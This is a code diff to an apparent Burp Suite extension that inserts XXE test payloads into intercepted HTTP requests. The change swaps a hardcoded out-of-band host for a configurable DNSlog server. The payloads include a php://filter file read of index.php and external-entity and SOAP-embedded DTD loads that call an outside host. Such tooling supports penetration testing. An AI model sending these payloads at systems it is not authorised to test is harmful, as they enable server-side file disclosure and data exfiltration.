@@ -2,6 +2,8 @@ package burp;
 
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.util.HashMap;
+
 import javax.swing.JMenu;
 
 //https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md
@@ -39,6 +41,7 @@ class XXEItemListener implements ActionListener {
     
     public byte[] GetNewRequest(byte[] request,int[] selectedIndex, String action){
 		String selectedString =null;
+		String dnslog = myburp.config.getBasicConfigs().get("DNSlogServer");
 		switch(action){
             case "Basic Test":
                 selectedString  =    "<!--?xml version=\"1.0\" ?-->\n" +
@@ -68,17 +71,17 @@ class XXEItemListener implements ActionListener {
                 selectedString = "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>";
                 break;
             case "Php wrapper in XXE 2":
-                selectedString =    "<!DOCTYPE foo [\n" +
+                selectedString =    ("<!DOCTYPE foo [\n" +
                                     "<!ELEMENT foo ANY >\n" +
-                                    "<!ENTITY % xxe SYSTEM \"php://filter/convert.bae64-encode/resource=http://xxe.bit.0y0.link\" >\n" +
-                                    "]>";
+                                    "<!ENTITY % xxe SYSTEM \"php://filter/convert.bae64-encode/resource=http://%s\" >\n" +
+                                    "]>").replace("%s", dnslog);
                 break;
             case "XXE inside SOAP":
-                selectedString =    "<soap:Body>\r\n" + 
+                selectedString =    ("<soap:Body>\r\n" + 
                 		"  <foo>\r\n" + 
-                		"    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://bit.0y0.link/xxeinsidesoap\"> %dtd;]><xxx/>]]>\r\n" + 
+                		"    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://%s/xxeinsidesoap\"> %dtd;]><xxx/>]]>\r\n" + 
                 		"  </foo>\r\n" + 
-                		"</soap:Body>";
+                		"</soap:Body>").replaceAll("%s", dnslog);
                 break;
             default:
                 break;
